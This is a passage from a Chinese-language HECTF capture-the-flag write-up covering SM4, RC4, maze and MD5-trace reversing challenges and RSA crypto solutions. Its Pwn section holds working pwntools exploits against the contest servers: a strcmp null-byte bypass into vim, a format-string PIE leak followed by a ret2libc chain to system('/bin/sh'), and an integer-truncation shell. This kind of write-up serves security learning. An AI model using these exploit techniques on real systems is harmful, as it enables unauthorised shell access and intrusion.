class="number">0xEF</span>, <span class="number">0x98</span>, <span class="number">0x7A</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x0B</span>, <span class="number">0x43</span>, <span class="number">0xED</span>, <span class="number">0xCF</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0xE4</span>, <span class="number">0xB3</span>, <span class="number">0x1C</span>,</span><br><span class="line">               <span class="number">0xA9</span>, <span class="number">0xC9</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0x95</span>, <span class="number">0x80</span>, <span class="number">0xDF</span>, <span class="number">0x94</span>, <span class="number">0xFA</span>, <span class="number">0x75</span>, <span class="number">0x8F</span>, <span class="number">0x3F</span>, <span class="number">0xA6</span>, <span class="number">0x47</span>, <span class="number">0x07</span>, <span class="number">0xA7</span>, <span class="number">0xFC</span>,</span><br><span class="line">               <span class="number">0xF3</span>, <span class="number">0x73</span>, <span class="number">0x17</span>, <span class="number">0xBA</span>, <span class="number">0x83</span>, <span class="number">0x59</span>, <span class="number">0x3C</span>, <span class="number">0x19</span>, <span class="number">0xE6</span>, <span class="number">0x85</span>, <span class="number">0x4F</span>, <span class="number">0xA8</span>, <span class="number">0x68</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xB2</span>, <span class="number">0x71</span>,</span><br><span class="line">               <span class="number">0x64</span>, <span class="number">0xDA</span>, <span class="number">0x8B</span>, <span class="number">0xF8</span>, <span class="number">0xEB</span>, <span class="number">0x0F</span>, <span class="number">0x4B</span>, <span class="number">0x70</span>, <span class="number">0x56</span>, <span class="number">0x9D</span>, <span class="number">0x35</span>, <span class="number">0x1E</span>, <span class="number">0x24</span>, <span class="number">0x0E</span>, <span class="number">0x5E</span>, <span class="number">0x63</span>, <span class="number">0x58</span>,</span><br><span class="line">               <span class="number">0xD1</span>, <span class="number">0xA2</span>, <span class="number">0x25</span>, <span class="number">0x22</span>, <span class="number">0x7C</span>, <span class="number">0x3B</span>, <span class="number">0x01</span>, <span class="number">0x21</span>, <span class="number">0x78</span>, <span class="number">0x87</span>, <span class="number">0xD4</span>, <span class="number">0x00</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0x9F</span>, <span class="number">0xD3</span>, <span class="number">0x27</span>,</span><br><span class="line">               <span class="number">0x52</span>, <span class="number">0x4C</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0xE7</span>, <span class="number">0xA0</span>, <span class="number">0xC4</span>, <span class="number">0xC8</span>, <span class="number">0x9E</span>, <span class="number">0xEA</span>, <span class="number">0xBF</span>, <span class="number">0x8A</span>, <span class="number">0xD2</span>, <span class="number">0x40</span>, <span class="number">0xC7</span>, <span class="number">0x38</span>, <span class="number">0xB5</span>,</span><br><span class="line">               <span class="number">0xA3</span>, <span class="number">0xF7</span>, <span class="number">0xF2</span>, <span class="number">0xCE</span>, <span class="number">0xF9</span>, <span class="number">0x61</span>, <span class="number">0x15</span>, <span class="number">0xA1</span>, <span class="number">0xE0</span>, <span class="number">0xAE</span>, <span class="number">0x5D</span>, <span class="number">0xA4</span>, <span class="number">0x9B</span>, <span class="number">0x34</span>, <span class="number">0x1A</span>, <span class="number">0x55</span>, <span class="number">0xAD</span>,</span><br><span class="line">               <span class="number">0x93</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0xF5</span>, <span class="number">0x8C</span>, <span class="number">0xB1</span>, <span class="number">0xE3</span>, <span class="number">0x1D</span>, <span class="number">0xF6</span>, <span class="number">0xE2</span>, <span class="number">0x2E</span>, <span class="number">0x82</span>, <span class="number">0x66</span>, <span class="number">0xCA</span>, <span class="number">0x60</span>, <span class="number">0xC0</span>, <span class="number">0x29</span>,</span><br><span class="line">               <span class="number">0x23</span>, <span class="number">0xAB</span>, <span class="number">0x0D</span>, <span class="number">0x53</span>, <span class="number">0x4E</span>, <span class="number">0x6F</span>, <span class="number">0xD5</span>, <span class="number">0xDB</span>, <span class="number">0x37</span>, <span class="number">0x45</span>, <span class="number">0xDE</span>, <span class="number">0xFD</span>, <span class="number">0x8E</span>, <span class="number">0x2F</span>, <span class="number">0x03</span>, <span class="number">0xFF</span>, <span class="number">0x6A</span>,</span><br><span class="line">               <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x5B</span>, <span class="number">0x51</span>, <span class="number">0x8D</span>, <span class="number">0x1B</span>, <span class="number">0xAF</span>, <span class="number">0x92</span>, <span class="number">0xBB</span>, <span class="number">0xDD</span>, <span class="number">0xBC</span>, <span class="number">0x7F</span>, <span class="number">0x11</span>, <span class="number">0xD9</span>, <span class="number">0x5C</span>, <span class="number">0x41</span>,</span><br><span class="line">               <span class="number">0x1F</span>, <span class="number">0x10</span>, <span class="number">0x5A</span>, <span class="number">0xD8</span>, <span class="number">0x0A</span>, <span class="number">0xC1</span>, <span class="number">0x31</span>, <span class="number">0x88</span>, <span class="number">0xA5</span>, <span class="number">0xCD</span>, <span class="number">0x7B</span>, <span class="number">0xBD</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0xD0</span>, <span class="number">0x12</span>, <span class="number">0xB8</span>,</span><br><span class="line">               <span class="number">0xE5</span>, <span class="number">0xB4</span>, <span class="number">0xB0</span>, <span class="number">0x89</span>, <span class="number">0x69</span>, <span class="number">0x97</span>, <span class="number">0x4A</span>, <span class="number">0x0C</span>, <span class="number">0x96</span>, <span class="number">0x77</span>, <span class="number">0x7E</span>, <span class="number">0x65</span>, <span class="number">0xB9</span>, <span class="number">0xF1</span>, <span class="number">0x09</span>, <span class="number">0xC5</span>, <span class="number">0x6E</span>,</span><br><span class="line">               <span class="number">0xC6</span>, <span class="number">0x84</span>, <span class="number">0x18</span>, <span class="number">0xF0</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x3A</span>, <span class="number">0xDC</span>, <span class="number">0x4D</span>, <span class="number">0x20</span>, <span class="number">0x79</span>, <span class="number">0xEE</span>, <span class="number">0x5F</span>, <span class="number">0x3E</span>, <span class="number">0xD7</span>, <span class="number">0xCB</span>, <span class="number">0x39</span>,</span><br><span class="line">               <span class="number">0x48</span>]</span><br><span class="line">        result = <span class="built_in">bytearray</span>()</span><br><span class="line">        <span class="comment"># 将 32bit 拆分成 4x8bit，依次进行S盒变换</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">list</span>(n.to_bytes(<span class="number">4</span>, <span class="string">&#x27;big&#x27;</span>)):</span><br><span class="line">            result.append(BOX[item])</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>.from_bytes(result, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_rot_left</span>(<span class="params">n, m</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;循环左移&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> ((n &lt;&lt; m) | (n &gt;&gt; (<span class="number">32</span> - m))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    </span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;AD763B4FCDCFD9251089FB0408A45F80&quot;</span>)  <span class="comment"># 128bit密钥</span></span><br><span class="line">sm4 = SM4Cipher(key)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 动调测试加密</span></span><br><span class="line"><span class="comment"># plaintext = bytes.fromhex(&quot;0123456789abcdeffedcba9876543210&quot;)  # 128bit明文</span></span><br><span class="line"><span class="comment"># print(sm4.encrypt(plaintext).hex())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">c = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;D75CDA22176DD392A1A570915F66A61C&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(sm4.decrypt(c).<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6f2069d8ab245446d789590d2cfe20d6</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="author’sB0x"><a href="#author’sB0x" class="headerlink" title="author’sB0x"></a>author’sB0x</h3><blockquote><p>still ez</p></blockquote><p>识别代码逻辑为RC4算法，key为 <code>thiskey</code>，提取密文hex为 <code>C3F5E5E2EC17E52ACA03B6FDC1BC704410CDA6130B9A73060E4DDE95129CD946</code>，</p><p>Cyberchef解出flag：<code>HECTF&#123;Th3CutW0rmF0rgiv3sTh3Pl0w&#125;</code></p><p>​    </p><h3 id="run"><a href="#run" class="headerlink" title="run"></a>run</h3><p>分析代码逻辑，为8层8*8迷宫，其中0为可走方块，1为不可走方块，wsad为上下左右，u为下一层，n为上一层。</p><p>将8层01迷宫矩阵打印出来，从第一层 (0,0) 手动模拟走迷宫，得到路径 <code>ssddssuuwwddndduuussdussasauudd</code>，加上HECTF{}即为flag。</p><p>​    </p><h3 id="还原md5"><a href="#还原md5" class="headerlink" title="还原md5"></a>还原md5</h3><blockquote><p>MD5(flag) = 55a573c5ff5ae053ee7f165c6e972613  哈哈哈，逆去吧</p><p>HINTS:</p><p>注意，re题目md5的flag提交时不需要再套HECTF{}</p></blockquote><p>txt内容像是调用libsfdata.so计算md5过程汇编操作记录，既然是全过程，肯定有读入原始数据，以16进制存入寄存器或内存的痕迹，HECT的hex值”48454354“，注意是小端序，全局搜索 <code>54434548</code>，找到 <code>r6=0x54434548</code> 疑似读入寄存器操作，继续全局搜索 <code>=&gt; r6=0x</code>，有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Line 44619: [23:49:43 081][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x0 =&gt; r6=0x54434548</span><br><span class="line">Line 44624: [23:49:43 081][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x4 =&gt; r6=0x444d5f46</span><br><span class="line">Line 44629: [23:49:43 082][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x8 =&gt; r6=0x31332b32</span><br><span class="line">Line 44634: [23:49:43 083][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0xc =&gt; r6=0x39363636</span><br><span class="line">Line 44639: [23:49:43 083][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x10 =&gt; r6=0x37313237</span><br><span class="line">Line 44644: [23:49:43 084][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x14 =&gt; r6=0x34393338</span><br><span class="line">Line 44649: [23:49:43 085][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x18 =&gt; r6=0x43753059</span><br><span class="line">Line 44654: [23:49:43 085][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x1c =&gt; r6=0x6f646e61</span><br><span class="line">Line 44659: [23:49:43 086][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x20 =&gt; r6=0x743f7431</span><br><span class="line">Line 44664: [23:49:43 087][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x24 =&gt; r6=0x4b233964</span><br><span class="line">Line 44669: [23:49:43 087][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x28 =&gt; r6=0x37705f6e</span><br><span class="line">Line 44674: [23:49:43 088][libsfdata.so 0x0b2eb] [8e58    ] 0x4000b2ea: &quot;ldr r6, [r1, r2]&quot; r1=0xbffff3c9 r2=0x2c =&gt; r6=0x80775576</span><br></pre></td></tr></table></figure><p>提取出r6的值hex转字符即为flag：<code>HECTF_MD2+31666972178394Y0uCando1t?td9#Kn_p7vUw</code></p><p>​    </p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>先利用 <code>\x00</code> 截断绕过 <code>strcmp</code> 比较，进入 <code>system(&#39;vim -R&#39;)</code> 的vim交互模式，再使用vim命令 <code>:e 文件名</code> 读取flag内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = remote(<span class="string">&#x27;121.4.111.50&#x27;</span>,<span class="number">32365</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">r.send(<span class="string">b&#x27;x&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;:e flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>值得注意的是，由于进入vim命令会清空终端内容，在pwntools交互下读取的内容会被瞬间刷掉，可以将输出重定向到文件，获取到flag内容输出：</p><p><code>python test.py &gt; output.txt</code></p><p>​    </p><h3 id="真·签到"><a href="#真·签到" class="headerlink" title="真·签到"></a>真·签到</h3><blockquote><p>听说你还没签上到</p></blockquote><p>int类型强制转换为char，当值为128~255时变成负数，模拟伪代码，在最大值2147483647附近尝试寻找所需数字：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> x = <span class="number">2147483646</span><span class="number">-124</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, x);</span><br><span class="line"><span class="type">int</span> y = x;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">char</span>)y);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, (<span class="type">char</span>)y&lt;<span class="number">-125</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, y&gt;<span class="number">255</span>);</span><br><span class="line">   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2147483522满足条件，传入后getshell拿到flag。</p><p>​    </p><h3 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h3><p>程序开了PIE，gdb动调，利用格式化字符串漏洞泄露当前函数地址，再减去偏移得到程序基址，剩下的部分简单ret2libc即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;121.4.102.43&#x27;</span>,<span class="number">31550</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fmt&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/root/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r,&#x27;b *$rebase(0x123a)&#x27;)</span></span><br><span class="line">r.recvline()</span><br><span class="line">r.send(<span class="string">b&#x27;%15$p&#x27;</span>)</span><br><span class="line">pie_base = <span class="built_in">eval</span>(r.recv(<span class="number">14</span>))-<span class="number">0x123a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(pie_base))</span><br><span class="line"></span><br><span class="line">pop_rdi = pie_base+<span class="number">0x1333</span></span><br><span class="line">pop_rsi_r15 = pie_base+<span class="number">0x1331</span></span><br><span class="line">ret = pie_base+<span class="number">0x101a</span></span><br><span class="line">puts_got = pie_base+elf.got.puts</span><br><span class="line">puts_plt = pie_base+elf.plt.puts</span><br><span class="line">get = pie_base+<span class="number">0x12ab</span></span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(get)</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr-libc.sym.puts</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base+libc.sym.system</span><br><span class="line">binsh = libc_base+libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(binsh)+p64(pop_rsi_r15)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(system)+p64(get)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(pl))</span><br><span class="line">r.sendline(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="流动的音符"><a href="#流动的音符" class="headerlink" title="流动的音符"></a>流动的音符</h3><p>txt内为音符加密，使用<a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">在线解密工具</a>解密得到flag。</p><p>​    </p><h3 id="matrix"><a href="#matrix" class="headerlink" title="matrix"></a>matrix</h3><p>出题失误，源码泄露拿到flag。</p><p>​    </p><h3 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">flag = <span class="string">b&#x27;xxx&#x27;</span></span><br><span class="line">e = <span class="number">114</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">t = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q * t</span><br><span class="line">p_=<span class="built_in">pow</span>(p,<span class="number">2</span>,n)</span><br><span class="line">q_=<span class="built_in">pow</span>(q,<span class="number">2</span>,n)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p_=&#x27;</span>,p_)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q_=&#x27;</span>,q_)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c=&#x27;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n=&#x27;</span>,n)</span><br><span class="line"><span class="comment">#p_= 10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801</span></span><br><span class="line"><span class="comment">#q_= 24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369</span></span><br><span class="line"><span class="comment">#c= 946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340</span></span><br><span class="line"><span class="comment">#n= 1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843 </span></span><br></pre></td></tr></table></figure></blockquote><p>因 $p^2&lt;n,q^2&lt;n$，可直接开放求得 $p,q$ 及 $r$。</p><p>又 $\gcd(e,\varphi)=6$，利用 $\gcd(\cfrac{e}{6},\varphi)=1$ 先常规RSA计算出 $m^6$ 再开方即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p_ = </span><br><span class="line">q_ = </span><br><span class="line">c = </span><br><span class="line">n = </span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = gmpy2.iroot(p_,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">q = gmpy2.iroot(q_,<span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">r = n//(p*q)</span><br><span class="line">f = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)</span><br><span class="line">e = <span class="number">114</span></span><br><span class="line">d = inverse_mod(e//<span class="number">6</span>,f)</span><br><span class="line">mm = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">m = gmpy2.iroot(mm,<span class="number">6</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;HECTF&#123;Congratulation!!you_find_flag&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="rsa2"><a href="#rsa2" class="headerlink" title="rsa2"></a>rsa2</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, hint, e1</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mygenerate</span>():</span><br><span class="line"> <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">     p = getPrime(<span class="number">512</span>)</span><br><span class="line">     <span class="keyword">if</span> p % <span class="number">8</span> == <span class="number">5</span>:</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"> g = p-random.randint(<span class="number">1</span> &lt;&lt; <span class="number">13</span>, <span class="number">1</span> &lt;&lt; <span class="number">15</span>)</span><br><span class="line"> q = sympy.nextprime(math.gamma(g+<span class="number">1</span>) % p)</span><br><span class="line"> <span class="keyword">return</span> p, g, q</span><br><span class="line"></span><br><span class="line">p, g, q = mygenerate()</span><br><span class="line">n = p*q</span><br><span class="line">e2 = <span class="number">65537</span></span><br><span class="line">m1 = bytes_to_long(flag)</span><br><span class="line">m2 = bytes_to_long(hint)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e1, p)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e2, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>+<span class="built_in">str</span>(p))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;g =&#x27;</span>+<span class="built_in">str</span>(g))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c1 =&#x27;</span>+<span class="built_in">str</span>(c1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2 =&#x27;</span>+<span class="built_in">str</span>(c2))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672846909</span></span><br><span class="line"><span class="string">g =8245512408967243371517759893329519667642119269153889262506106732818518415823601207067006537187243355250850586456796829524581895578331334132038513672815766</span></span><br><span class="line"><span class="string">c1 =6235217214618484469008717065109058585860810027126999050539741461978786126300064219884646722757808536523766850480291000964963856026236813451563022630637528</span></span><br><span class="line"><span class="string">c2 =11968687437667021636457941077557698735979559596315355015261643918655719362366246657937192921814834456270616376603153881488026042955084056042773344426448580968726245676672896245296438903588066436834165402064132845092674100931069500643230951702318353312541552786636249326131049369846465301549915712690800690627</span></span><br><span class="line"><span 